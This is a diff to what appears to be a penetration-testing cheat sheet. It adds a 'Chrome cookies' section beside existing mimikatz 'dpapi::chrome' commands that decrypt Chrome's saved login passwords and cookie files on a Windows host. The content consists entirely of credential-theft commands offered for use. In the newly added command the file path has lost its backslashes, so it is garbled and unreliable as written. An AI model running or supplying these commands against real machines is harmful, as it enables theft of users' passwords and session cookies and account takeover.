@@ -11,6 +11,13 @@
 ````
 mimikatz dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotectbeacon> mimikatz dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Cookies" /unprotect
 ````
+### Chrome cookies
+
+````
+ dpapi::chrome /in:"%localappdata%GoogleChromeUser DataDefaultCookies" /unprotect
+````
+
+
 
 ## Download with Powershell
 
